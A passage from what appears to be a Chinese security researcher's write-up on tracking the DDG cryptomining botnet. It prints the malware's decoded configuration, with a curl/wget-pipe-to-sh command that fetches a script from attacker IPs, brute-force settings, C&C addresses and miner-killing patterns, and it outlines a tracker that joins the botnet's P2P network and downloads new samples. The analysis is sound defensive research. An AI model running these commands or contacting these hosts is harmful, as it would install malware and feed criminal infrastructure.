'1m',</div><div class="line">                'Version': 3017</div><div class="line">            &#125;,</div><div class="line">            'AAssh': &#123;</div><div class="line">                'Duration': '240h',</div><div class="line">                'GenAAA': False,</div><div class="line">                'GenLan': True,</div><div class="line">                'IPDuration': '12h',</div><div class="line">                'Id': 2057,</div><div class="line">                'NThreads': 100,</div><div class="line">                'Ports': [22, 2222, 12222, 52222, 1987],</div><div class="line">                'ShellUrl': 'hxxp://104.248.181.42:8000/i.sh',</div><div class="line">                'Timeout': '1m',</div><div class="line">                'Version': 3017</div><div class="line">            &#125;,</div><div class="line">            'Killer': [&#123;</div><div class="line">                    'Expr': '(/tmp/ddgs.3011|/tmp/ddgs.3012|/tmp/ddgs.3013|/tmp/ddgs.3014|/tmp/ddgs.3015|   /tmp/ddgs.3016|/tmp/ddgs.3017|/tmp/ddgs.3019)',</div><div class="line">                    'Id': 475,</div><div class="line">                    'Timeout': '60s',</div><div class="line">                    'Version': 3017</div><div class="line">                &#125;,</div><div class="line">                &#123;</div><div class="line">                    'Expr': '.+(cryptonight|stratum+tcp://|dwarfpool.com|supportxmr.com).+',</div><div class="line">                    'Id': 483,</div><div class="line">                    'Timeout': '60s',</div><div class="line">                    'Version': -1</div><div class="line">                &#125;,</div><div class="line">                &#123;</div><div class="line">                    'Expr': './xmr-stak|./.syslog|/bin/wipefs|./xmrig|/tmp/wnTKYg|/tmp/2t3ik',</div><div class="line">                    'Id': 484,</div><div class="line">                    'Timeout': '60s',</div><div class="line">                    'Version': -1</div><div class="line">                &#125;,</div><div class="line">                &#123;</div><div class="line">                    'Expr': '/tmp/qW3xT.+',</div><div class="line">                    'Id': 481,</div><div class="line">                    'Timeout': '60s',</div><div class="line">                    'Version': 3017</div><div class="line">                &#125;</div><div class="line">            ],</div><div class="line">            'LKProc': [&#123;</div><div class="line">                'Expr': '/tmp/qW3xT.5',</div><div class="line">                'Id': 488,</div><div class="line">                'Timeout': '60s',</div><div class="line">                'Version': 3020</div><div class="line">            &#125;],</div><div class="line">            'Sh': [&#123;</div><div class="line">                    'Id': 479,</div><div class="line">                    'Line': '(curl -fsSL hxxp://104.248.181.42:8000/i.sh||wget -q -O-  hxxp://132.148.241.138:8000/i.sh) | sh',</div><div class="line">                    'Timeout': '120s',</div><div class="line">                    'Version': -1</div><div class="line">                &#125;,</div><div class="line">                &#123;</div><div class="line">                    'Id': 486,</div><div class="line">                    'Line': 'chattr -i /tmp/qW3xT.5; chmod +x /tmp/qW3xT.5',</div><div class="line">                    'Timeout': '20s',</div><div class="line">                    'Version': 3017</div><div class="line">                &#125;</div><div class="line">            ]</div><div class="line">        &#125;,</div><div class="line">        'Config': &#123;</div><div class="line">            'Interval': '60s'</div><div class="line">        &#125;,</div><div class="line">        'Miner': [&#123;</div><div class="line">            'Exe': '/tmp/qW3xT.5',</div><div class="line">            'Md5': 'fb6bf5af8771b0dc446861484335fc5e',</div><div class="line">            'Url': '/static/qW3xT.5'</div><div class="line">        &#125;]</div><div class="line">    &#125;,</div><div class="line">    'Signature': [0x3b,0xd9,0x73,0x04,0x6d,0x75,0x68,0xe8,0xdd,0xd6,0x0c,0x5e,0xac,0xd1,0x29,0x2d,0x16,0x31,0x03,0xf4,0xfb,0xbb,0xa8,0x7d,0xba,0x6a,0xc8,0xda,0x6f,0xec,0x42,0x16,0x6a,0x00,0x8b,0x62,0x3f,0xa1,0x11,0x9b,0x16,0xe8,0xf2,0x13,0xb1,0x45,0x40,0xc5,0xd4,0xc6,0xaa,0x90,0x99,0x98,0x4b,0xc9,0x70,0x66,0x77,0x18,0xa9,0x82,0x53,0xb9,0x4f,0x10,0x05,0xdf,0x8d,0x6c,0x3a,0x31,0x2b,0x45,0x6f,0x9d,0xcb,0xd2,0x7d,0x5e,0x90,0x5f,0xb9,0x59,0x9e,0xa2,0x40,0x02,0x1b,0xe9,0xed,0xd5,0x57,0xb5,0x09,0x41,0x1e,0xd8,0x41,0xd8,0x0b,0xa8,0xd1,0x54,0x00,0xab,0x43,0xdc,0x70,0xce,0xca,0x14,0xc5,0x19,0xc9,0x37,0x0f,0x19,0xe0,0x02,0x95,0x30,0x57,0xa6,0xbb,0xc4,0xa6,0x85,0x51,0xcc,0x9b,0x0d,0xc4,0xc5,0x7d,0xb9,0xc4,0xa0,0x93,0x00,0xec,0x52,0x06,0x77,0xfe,0x82,0x52,0x1e,0x88,0xf2,0xe2,0xc6,0x21,0x3e,0x81,0x7e,0x1e,0x53,0x9d,0xb0,0xab,0xd4,0xc2,0xa3,0x85,0x8b,0xef,0xac,0xdd,0x9d,0x4b,0x5a,0x13,0x8e,0xa1,0x31,0x6d,0xc5,0xb2,0xf4,0xca,0x54,0x85,0x29,0xa0,0x62,0x0d,0xac,0xde,0xfa,0x86,0x09,0x2b,0x1c,0x05,0x5f,0xa0,0xa4,0x91,0x11,0xb0,0x6d,0x7e,0x1c,0xab,0x31,0x6f,0xca,0x64,0x15,0x44,0xe5,0xaf,0x24,0x12,0xb6,0x74,0xde,0x9c,0xc1,0xf7,0x0c,0x22,0x80,0x1f,0x07,0x2b,0x57,0xe2,0xfb,0xf9,0x39,0x0b,0x1b,0x4f,0xa3,0x82,0x07,0xce,0x35,0x41,0x23,0x73,0x94,0x8c,0x27,0x1b,0x77,0x1f,0x5e,0xdd,0xb5,0xb1,0xa6,0xa1,0x6c]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>注意配置数据最后一项： <strong>Signature</strong> ，这其实是木马作者拿自己的 RSA 私钥对配置数据中的 <strong>Data</strong> 部分（真正用到的配置）生成的一个 RSA 签名字段。样本在解码配置数据之后，会用样本中内置的 RSA 公钥对 <strong>Data</strong> 部分配置数据进行校验，校验通过之后才会采用这些配置。样本中内置的 RSA 公钥如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">-----BEGIN PUBLIC KEY-----</div><div class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1+/izrOGcigBPC+oXnr2  </div><div class="line">S3JI76iXxqn7e9ONAmNS+m5nLQx2g0GW44TFtMHhDp1lPdUIui1b1odu36i7Cf0g  </div><div class="line">31vdYi1i6nGfXiI7UkHMsLVkGkxEknNL1c1vv0qE1b2i2o4TlcXHKHWOPu4xrpYY  </div><div class="line">m3Fqjni0n5+cQ8IIcVyjkX7ON0U1n8pQKRWOvrsPhO6tvJnLckK0P1ycGOcgNiBm  </div><div class="line">sdA5WDjw3sg4xWCQ9EEpMeB0H1UF/nv7AZQ0etncMxhiWoBxamuPWY/KS3wZStUd  </div><div class="line">gsMBOAOOpnbxL9N+II7uquQQkMmO6HriXRmjw14OmSBEoEcFMWF2j/0HPVasOcx2  </div><div class="line">xQIDAQAB  </div><div class="line">-----END PUBLIC KEY-----</div></pre></td></tr></table></figure>
+<p>由此可见，这份配置数据无法伪造。这样一来，我们就只能加入 DDG 的 P2P 网络进行节点探测，而无法对整个 P2P 网络进行投毒。</p>
+<h3 id="2-4-ddg-的-P2P-节点"><a href="#2-4-ddg-的-P2P-节点" class="headerlink" title="2.4 ddg 的 P2P 节点"></a>2.4 ddg 的 P2P 节点</h3><p>ddg 的主样本通过 Memberlist 框架成功加入了 P2P 网络之后，就会调用 <code>memberlist.Members()</code> 函数来获取当前 P2P 网络中的 Peers 列表。在 ddg 最近的几个版本中，主样本会把这份 Peers 列表保存到受害主机本地 <code>~/.ddg/&lt;VERSION_NUMBER&gt;.bs</code> 文件中。最新的版本则不会保存到本地，而是用开源的内嵌 KV 存储引擎 <a href="https://github.com/boltdb/bolt" target="_blank" rel="external">Bolt</a> 取代了之前的 <code>~/.ddg/&lt;VERSION_NUMBER&gt;.bs</code> 文件。即，样本获取到的 Peers 列表不再明文存储到本地文件中，而是存放到了内嵌的一个小型数据库中。</p>
+<p>我们要获取 ddg 的 Peers 节点，就可以直接通过调用 <code>memberlist.Members()</code> 函数来获取。</p>
+<h2 id="3-追踪程序设计"><a href="#3-追踪程序设计" class="headerlink" title="3. 追踪程序设计"></a>3. 追踪程序设计</h2><h3 id="3-1-追踪程序的执行流程"><a href="#3-1-追踪程序的执行流程" class="headerlink" title="3.1 追踪程序的执行流程"></a>3.1 追踪程序的执行流程</h3><p>前面说过，设计追踪程序的最终目标，有 4 个，其中涉及到 Peer 信息的获取和保存、样本与配置数据的解析和保存、记录最新启用的 C&amp;C Server ……这样一来，就不可避免地将相关数据和文件保存到本地或数据库中。</p>
+<p>我们可以把最新一次探测到的 P2P 节点信息存储到数据库中，把样本文件、配置数据、最新的 C&amp;C Server 列表保存到本地文件中。根据 <strong>Memberlist</strong> 框架的实现，程序要调用 <code>memberlist.Join()</code> 函数来加入一个已存在的 P2P 网络，而这个函数需要一个 IP List( Go 变量 <code>[] string</code> ，下文简称 <strong>init_peers</strong>) 来作为加入 P2P 网络的“介绍人”。当然，这个 IP List 中的 IP，应该是当前已加入 P2P 网络的 IP (按照这个概念，这些 IP 应该是对应常规 P2P 网络中的 Node，P2P 网络中的 <strong>Node</strong> 和 <strong>Peer</strong> 的概念可以自行了解，为了简化描述，本文把 P2P 网络中的节点统称为 <strong>Peer</strong>)。</p>
+<p>前文还说过，ddg 主样本中有一份内置硬编码的 HUB IP List。其实，这一份 HUB IP List 就可以拿来当做 <code>memberlist.Join()</code> 函数的参数，即 <strong>init_peers</strong>。为了方便程序运行，我们可以把这一份 IP List 提前保存到数据库中，追踪程序每次运行，都要先从数据库中读取最新的 <strong>init_peers</strong>，通过 <strong>init_peers</strong> 加入 ddg 的 P2P 网络。</p>
+<p>这里先说一下追踪程序的概要执行流程，后面分步骤详细说明：</p>
+<ol>
+<li>从数据库中读取 <strong>init_peers</strong> IP List ，并调用 <strong>memberlist.Join()</strong> 加入 ddg 的 P2P 网络；</li>
+<li>成功加入 P2P 网络后，调用 <code>memberlist.Members()</code> 获取当前网络中的最新 Peers List；</li>
+<li>解析获取到的 Peers List 中的 Peers 信息，将每个 Peer 信息拆解成 <strong>IP:Port:Versioin:Hash:DateTime</strong> 5 元组，存到数据库中；</li>
+<li>将每个 Peer IP ，拼接 URL 串 <code>http://&lt;peer_ip&gt;:8000/slave</code> ，并向该 URL 发送 Post 请求，以获取经过 msgPack 编码的配置数据；</li>
+<li>如果成功从某个 Peer 上获取到了配置数据，则：<ul>
+<li>将该 Peer IP 暂存到一个非重复的、并发安全的 IP List 结构中；</li>
+<li>保存 RAW 格式的配置数据到本地；</li>
+<li>用该 Peer IP 拼接 URL 串 <code>http://&lt;peer_ip&gt;:8000/i.sh</code> ，并用 HTTP GET 请求的方式尝试获取最新的恶意 Shell 脚本；</li>
+<li>对比上述 i.sh 下载链接与刚获取到的最新配置数据中执行的 i.sh 下载链接是否相同，不同则对最新配置数据中指定的 i.sh 脚本也做下载&amp;解析操作。</li>
+</ul>
+</li>
+<li>如果成功获取到 i.sh 脚本，则解析其中的样本 Download URL，下载样本，同本地已下载到的其他样本 MD5 和下载 URL 作对比，MD5 和 下载 URL 其中之一是新的，就保留样本，否则删除刚下载到的样本。对于新样本，通过 Slack 的 Message 接口 Push 相关消息到自己的 Slack Channel 中；</li>
+<li>最后，将非重复的最新活跃的 C&amp;C Server 列表保存到本地文件中。</li>
+</ol>
+<h3 id="3-2-加入-P2P-网络"><a href="#3-2-加入-P2P-网络" class="headerlink" title="3.2 加入 P2P 网络"></a>3.2 加入 P2P 网络</h3><p>前文提到，调用 <code>memberlist.Join()</code> 来加入 ddg 的 P2P 网络，需要一个 <strong>init_peers</strong> 的 IP List。这个 IP List 最初来自 ddg 主样本中硬编码的 HUB IP List，而以后追踪程序每次执行，都要先从数据库中获取这个 IP List。这里先给出一个可用的数据表结构，用来存储 Peer 信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">+---------+----------------------+------+-----+---------+----------------+</div><div class="line">| Field   | Type                 | Null | Key | Default | Extra          |</div><div class="line">+---------+----------------------+------+-----+---------+----------------+</div><div class="line">| id      | int(10) unsigned     | NO   | PRI | &lt;null&gt;  | auto_increment |</div><div class="line">| ip      | char(16)             | NO   |     | &lt;null&gt;  |                |</div><div class="line">| port    | smallint(5) unsigned | NO   |     | &lt;null&gt;  |                |</div><div class="line">| version | smallint(5) unsigned | NO   |     | &lt;null&gt;  |                |</div><div class="line">| hash    | char(32)             | YES  |     | &lt;null&gt;  |                |</div><div class="line">| tdate   | datetime             | NO   |     | &lt;null&gt;  |                |</div><div class="line">+---------+----------------------+------+-----+---------+----------------+</div></pre></td></tr></table></figure>
+<p>最新的 Peers 信息在我们加入 ddg 的 P2P 网络后可以调用 <code>memberlist.Members()</code> 来获取。在 <strong>Memberlist</strong> 框架的源码中，这个函数返回的是一个 Node 信息指针列表 (Go 语言变量 <code>[]*Node</code>)。Memberlist 框架中的 <strong>Node</strong> 结构体的定义如下：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Node represents a node in the cluster.</span></div><div class="line"><span class="keyword">type</span> Node <span class="keyword">struct</span> &#123;</div><div class="line">	Name <span class="keyword">string</span></div><div class="line">	Addr net.IP</div><div class="line">	Port <span class="keyword">uint16</span></div><div class="line">	Meta []<span class="keyword">byte</span> <span class="comment">// Metadata from the delegate for this node.</span></div><div class="line">	PMin <span class="keyword">uint8</span>  <span class="comment">// Minimum protocol version this understands</span></div><div class="line">	PMax <span class="keyword">uint8</span>  <span class="comment">// Maximum protocol version this understands</span></div><div class="line">	PCur <span class="keyword">uint8</span>  <span class="comment">// Current version node is speaking</span></div><div class="line">	DMin <span class="keyword">uint8</span>  <span class="comment">// Min protocol version for the delegate to understand</span></div><div class="line">	DMax <span class="keyword">uint8</span>  <span class="comment">// Max protocol version for the delegate to understand</span></div><div class="line">	DCur <span class="keyword">uint8</span>  <span class="comment">// Current version delegate is speaking</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>其中第一项 <strong>Name</strong> 是形如 <strong>VerNumber.HashValue</strong>  的一个字符串，如：<strong>3020.b1634b9e0c747a6ae728e07c40883e2d</strong> 。这里的 Hash 值在 Memberlist 框架中被定义为 <strong>UID</strong> ，每一个 Peer 都不同，其值是通过对当前 Peer 主机的网络配置用 MD5 算法计算得出。</p>
+<p>Memberlist 的<a href="https://github.com/hashicorp/memberlist" target="_blank" rel="external">开源项目主页</a>上，有一个简单的 Usage Demo，演示加入一个集群(本文就指 ddg 的 P2P 网络了)并获取节点信息的最简方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">/* Create the initial memberlist from a safe configuration.</div><div class="line">   Please reference the godoc for other default config types.</div><div class="line">   http://godoc.org/github.com/hashicorp/memberlist#Config</div><div class="line">*/</div><div class="line">list, err := memberlist.Create(memberlist.DefaultLocalConfig())</div><div class="line">if err != nil &#123;</div><div class="line">	panic(&quot;Failed to create memberlist: &quot; + err.Error())</div><div class="line">&#125;</div><div class="line"></div><div class="line">// Join an existing cluster by specifying at least one known member.</div><div class="line">n, err := list.Join([]string&#123;&quot;1.2.3.4&quot;&#125;)</div><div class="line">if err != nil &#123;</div><div class="line">	panic(&quot;Failed to join cluster: &quot; + err.Error())</div><div class="line">&#125;</div><div class="line"></div><div class="line">// Ask for members of the cluster</div><div class="line">for _, member := range list.Members() &#123;</div><div class="line">	fmt.Printf(&quot;Member: %s %s\n&quot;, member.Name, member.Addr)</div><div class="line">&#125;</div><div class="line"></div><div class="line">// Continue doing whatever you need, memberlist will maintain membership</div><div class="line">// information in the background. Delegates can be used for receiving</div><div class="line">// events when members join or leave.</div></pre></td></tr></table></figure>
+<p>可以看到在执行 <strong>Join()</strong> 函数加入集群之前，还要调用 <strong>memberlist.Create()</strong> 函数生成一个 Peer 对象(代表当前 Peer)，然后用当前对象执行 <strong>Join</strong> 以及后续操作。这里有一个关键点是当前 Peer 的配置。这份配置的底层结构体定义，在 <a href="https://godoc.org/github.com/hashicorp/memberlist#Config" target="_blank" rel="external">Memberlist 的 Godoc 文档</a>中有详细说明，此处不赘述。这份配置结构中的两个关键配置项(网络配置和密钥)，关乎到追踪程序能否成功加入到 ddg 的 P2P 网络中，以及加入之后能否正常与其他 Peers 通信，这两个关键点要<strong>逆向 ddg 主样本</strong>和熟知 <strong>Memberlist 的原理和实现</strong>才能搞定，这里也不赘述。想要自行实现这么一套追踪程序，需要自行完成这两个工作。</p>
+<p>需要一提的是，配置项中有一个关于日志输出的配置项：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">// Logger is a custom logger which you provide. If Logger is set, it will use</div><div class="line">// this for the internal logger. If Logger is not set, it will fall back to the</div><div class="line">// behavior for using LogOutput. You cannot specify both LogOutput and Logger</div><div class="line">// at the same time.</div><div class="line">Logger *log.Logger</div></pre></td></tr></table></figure>
+<p>我们要用到日志功能，把全局的日志句柄配置在这里，这样 Memberlist 整个框架的运行日志都会打到我们指定的日志文件中。</p>
+<h3 id="3-3-获取并解析最新的-Peers-List"><a href="#3-3-获取并解析最新的-Peers-List" class="headerlink" title="3.3 获取并解析最新的 Peers List"></a>3.3 获取并解析最新的 Peers List</h3><p>前文提到，获取最新的 Peers List，只需在加入 ddg 的 P2P 网络后调用 <code>memberlist.Members()</code> 即可。</p>
+<p>其实只说了一半，因为这里还有个偶然发现的小 Trick：这个函数获取到的 Peers List 数量并不大，反倒是从 Memberlist 框架的运行日志中可以抽取更多 Peer 信息。</p>
+<p>根据 Memberlist 的框架特性，当前节点加入 P2P 网络之后，会随机与其他 Peers 以 Gossip 的形式通信，这种通信具有节点探测的功能。通信的结果会记录在日志中，尤其是通信失败的日志，记录的比较详细。一条失败的 Gossip 通信日志如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">2019/01/23 08:44:53 [ERR] memberlist: Failed to send gossip to 58.144.150.24:7946: write udp 127.0.0.1:7946-&gt;58.144.150.24:7946: sendto: invalid argument</div></pre></td></tr></table></figure>
+<p>打出这段日志的代码，在 <a href="https://github.com/hashicorp/memberlist/blob/master/state.go" target="_blank" rel="external">memberlist/stat.go</a> 中实现：</p>
+<p><img src="/imgs/gossip_failed_msg.png" alt=""></p>
+<p>不过，这段错误信息还不足以提供我们想要的 Peer Info 5 元组。那就动手 Patch 一下这段代码，让它打出我们想要的信息。Patch 后的代码如下：</p>
+<p><img src="/imgs/gossip_failed_msg_patched.png" alt=""></p>
+<p>然后，打出来的日志内容就会是如下形式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">2019/02/24 18:01:06 [ERR] memberlist: Failed to send gossip to (114.118.18.70:7946:3020:91f7f67194e0d31d9b58d9e6bef4f711)</div></pre></td></tr></table></figure>
+<p>这样，既缩减了日志文件的体积，也能精准捕获到我们需要的信息。然后，就可以把 <code>memberlist.Members()</code> 函数获取到的 Peers 信息和日志文件中打出来的 Peers 信息汇总起来，保存到一个变量中，以待后用。</p>
+<h3 id="3-4-保存-Peers-信息"><a href="#3-4-保存-Peers-信息" class="headerlink" title="3.4 保存 Peers 信息"></a>3.4 保存 Peers 信息</h3><p>将上述步骤获取到的 Peers 信息保存到数据库中，最新的 20 条 Peers 信息示例如下：</p>
+<p><img src="/imgs/latest_20_peers.png" alt=""></p>
+<h3 id="3-5-探测最新活跃的-C-amp-C，拉取最新的配置数据"><a href="#3-5-探测最新活跃的-C-amp-C，拉取最新的配置数据" class="headerlink" title="3.5 探测最新活跃的 C&amp;C，拉取最新的配置数据"></a>3.5 探测最新活跃的 C&amp;C，拉取最新的配置数据</h3><p>对上面获取到的 Peers Info 中的每一个 Peer IP，拼接成 URL 串 <code>http://&lt;peer_ip&gt;:8000/slave</code> ，向该 URL 发 Post 请求。能获取符合格式的配置数据的，即为当前存活的 C&amp;C IP。把存活的 C&amp;C Host 信息保存到一个非重复的、并发安全的 List 结构的变量中，最后把这份 C&amp;C Host 列表保存到本地文件中。本地 C&amp;C Host 文件列表部分内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">➜ tail cc_server.list</div><div class="line">20190503060101  132.148.241.138:8000</div><div class="line">20190503060101  109.237.25.145:8000</div><div class="line">20190503060101  104.128.230.16:8000</div><div class="line">20190503060101  117.141.5.87:8000</div><div class="line">20190506060101  132.148.241.138:8000</div><div class="line">20190506060101  104.128.230.16:8000</div><div class="line">20190506060101  117.141.5.87:8000</div><div class="line">20190506120102  104.128.230.16:8000</div><div class="line">20190506120102  132.148.241.138:8000</div><div class="line">20190506120102  117.141.5.87:8000</div></pre></td></tr></table></figure>
+<p>前面提到过 ddg 配置数据是经过 msgPack 编码的，前文也列出了解码后的配置数据示例。受限于 Memberlist 的框架实现，我们的追踪程序也只能用 Go 语言来实现。要解码这份配置数据，直接调用 msgPack 的 Go 语言 API 是不够的，还需要逆向分析出配置数据的正确结构，并用 Go 语言的语法来定义这个配置数据的结构。下面是掉了两把头发才逆向出来的配置数据结构，以 Go 语言来定义的结构体：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> msgpack</div><div class="line"><span class="comment">/*</span></div><div class="line">	Salve conf struct</div><div class="line">*/</div><div class="line"></div><div class="line"><span class="keyword">type</span> Conf <span class="keyword">struct</span> &#123;</div><div class="line">	Data      []<span class="keyword">byte</span></div><div class="line">	Signature []<span class="keyword">byte</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> ConfData <span class="keyword">struct</span> &#123;</div><div class="line">	CfgVer <span class="keyword">int</span></div><div class="line">	Config MainConf</div><div class="line">	Miner  []MinerConf</div><div class="line">	Cmd    CmdConf</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> MainConf <span class="keyword">struct</span> &#123;</div><div class="line">	Interval <span class="keyword">string</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> MinerConf <span class="keyword">struct</span> &#123;</div><div class="line">	Exe <span class="keyword">string</span></div><div class="line">	Md5 <span class="keyword">string</span></div><div class="line">	Url <span class="keyword">string</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> CmdConf <span class="keyword">struct</span> &#123;</div><div class="line">	AAredis CmdConfDetail</div><div class="line">	AAssh   CmdConfDetail</div><div class="line">	Sh      []ShConf</div><div class="line">	Killer  []ProcConf</div><div class="line">	LKProc  []ProcConf</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> CmdConfDetail <span class="keyword">struct</span> &#123;</div><div class="line">	Id         <span class="keyword">int</span></div><div class="line">	Version    <span class="keyword">int</span></div><div class="line">	ShellUrl   <span class="keyword">string</span></div><div class="line">	Duration   <span class="keyword">string</span></div><div class="line">	NThreads   <span class="keyword">int</span></div><div class="line">	IPDuration <span class="keyword">string</span></div><div class="line">	GenLan     <span class="keyword">bool</span></div><div class="line">	GenAAA     <span class="keyword">bool</span></div><div class="line">	Timeout    <span class="keyword">string</span></div><div class="line">	Ports      []<span class="keyword">int</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> ShConf <span class="keyword">struct</span> &#123;</div><div class="line">	Id      <span class="keyword">int</span></div><div class="line">	Version <span class="keyword">int</span></div><div class="line">	Line    <span class="keyword">string</span></div><div class="line">	Timeout <span class="keyword">string</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> ProcConf <span class="keyword">struct</span> &#123;</div><div class="line">	_msgpack <span class="keyword">struct</span>&#123;&#125; <span class="string">`msgpack:",omitempty"`</span></div><div class="line">	Id       <span class="keyword">int</span></div><div class="line">	Version  <span class="keyword">int</span></div><div class="line">	Expr     <span class="keyword">string</span></div><div class="line">	Timeout  <span class="keyword">string</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>将解码成功的配置数据打到日志文件中，只把未解码的 RAW 配置数据保存到本地。最新获取到的配置数据如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">➜ ll -t slave_conf | head</div><div class="line">total 4.6M</div><div class="line">2.0K May  6 12:34 117_141_5_87__20190506123410.raw    </div><div class="line">2.0K May  6 12:34 132_148_241_138__20190506123410.raw </div><div class="line">2.0K May  6 12:33 104_128_230_16__20190506123309.raw  </div><div class="line">2.0K May  6 06:33 104_128_230_16__20190506063312.raw  </div><div class="line">2.0K May  6 06:31 117_141_5_87__20190506063142.raw    </div><div class="line">2.0K May  6 06:30 132_148_241_138__20190506063042.raw </div><div class="line">2.0K May  6 00:39 104_128_230_16__20190506003932.raw  </div><div class="line">2.0K May  6 00:37 117_141_5_87__20190506003723.raw    </div><div class="line">2.0K May  6 00:34 132_148_241_138__20190506003442.raw</div></pre></td></tr></table></figure>
+<h3 id="3-6-下载最新样本"><a href="#3-6-下载最新样本" class="headerlink" title="3.6 下载最新样本"></a>3.6 下载最新样本</h3><p>对于上面步骤中，每一个可以获取合格配置数据的 C&amp;C IP，拼接 URL 串 <code>http://&lt;cc_ip&gt;:8000/i.sh</code> ，这是 ddg 目前用到的最新恶意 Shell 脚本的下载链接。通过 HTTP GET 请求下载这个 i.sh 文件，跟本地已有的、相同 URL 下载到的 i.sh 文件对比 MD5 值，如果 MD5 跟旧的 i.sh 相同，则丢弃刚下载 i.sh 文件。</p>
+<p>如果最新的 i.sh 文件跟旧 i.sh 文件 MD5 不同，则进行以下两步操作：</p>
+<ol>
+<li><p>对比上述 i.sh 下载链接与刚获取到的最新配置数据中执行的 i.sh 下载链接是否相同，不同则对最新配置数据中指定的 i.sh 脚本也做下载&amp;解析操作；</p>
+</li>
+<li><p>成功获取到 i.sh 脚本，则解析其中的样本 Download URL，下载样本，同本地相同 URL 下载到的样本对比 MD5 和 FileName(其实是 Download URL)，如果 MD5 或者 FileName 不同，则保留样本，否则删除刚下载到的样本。</p>
+<p>样本 MD5 和 FileName 的对比结果，有三种情况：</p>
+<ul>
+<li><p>仅仅 MD5 不同而 FileName 相同，说明同一个 URL 中下到了不同 MD5 的样本，即样本有更新；</p>
+</li>
+<li><p>仅仅 FileName 不同而 MD5 相同，则不同的 URL 想到了相同 MD5 的样本，通常意味着 C&amp;C 有变动；</p>
+</li>
+<li><p>两者都不同则说明 C&amp;C 有变动并且样本有更新。</p>
+</li>
+</ul>
+</li>
+</ol>
+<p>截至目前，我通过 ddg 追踪程序监控到的部分 ddg 样本如下：</p>
